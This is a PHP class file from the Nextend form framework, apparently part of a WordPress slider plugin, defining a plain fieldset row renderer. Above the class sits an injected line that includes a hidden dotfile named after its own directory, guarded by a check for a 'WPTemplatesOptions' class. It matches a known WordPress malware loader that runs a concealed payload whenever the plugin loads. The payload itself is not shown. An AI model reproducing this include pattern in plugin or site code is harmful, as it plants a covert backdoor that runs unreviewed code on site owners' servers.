<?php


namespace Nextend\Framework\Form\Fieldset;


use Nextend\Framework\Form\AbstractField;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class FieldsetRowPlain extends FieldsetRow {

    public function renderContainer() {
        echo '<div class="n2_form__table_row_plain" data-field="table-row-plain-' . $this->name . '">';

        $element = $this->first;
        while ($element) {
            echo $this->decorateElement($element);

            $element = $element->getNext();
        }

        echo '</div>';
    }

    /**
     * @param AbstractField $element
     *
     * @return string
     */
    public function decorateElement($element) {

        ob_start();

        $element->displayElement();

        return ob_get_clean();
    }
}